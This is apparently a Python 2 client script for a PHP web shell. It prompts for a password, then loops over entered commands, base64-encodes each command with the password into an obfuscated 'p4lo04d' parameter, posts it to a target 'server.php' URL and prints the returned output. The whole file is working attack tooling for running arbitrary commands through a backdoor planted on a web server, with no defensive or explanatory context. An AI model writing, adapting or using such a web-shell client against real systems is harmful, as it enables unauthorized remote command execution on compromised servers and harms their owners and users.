# coding: utf-8
import requests
import sys
import base64
import hashlib
import itertools
import os

url = ""

try:
    url = sys.argv[1]
    url_check = requests.get(url)
    if (url_check.status_code == 200):
        cmd = ""
        passw = raw_input("Enter your password : ")
        passw_md5 = hashlib.md5(passw).hexdigest()

        while (cmd != "exit"):

            cmd = raw_input("Enter your command : ")
            p4lo04d = cmd + ":" + passw
            encoded_p4lo04d = base64.b64encode(p4lo04d.encode())

            payload = {"p4lo04d": encoded_p4lo04d}

            r = requests.post(url_check.url, params=payload)

            if (r.status_code == 200):
                print r.text[7:]
            else:
                print("something bad happend brah ~!~")
except:

    print("usage :> python client.py http://127.0.0.1/server.php")
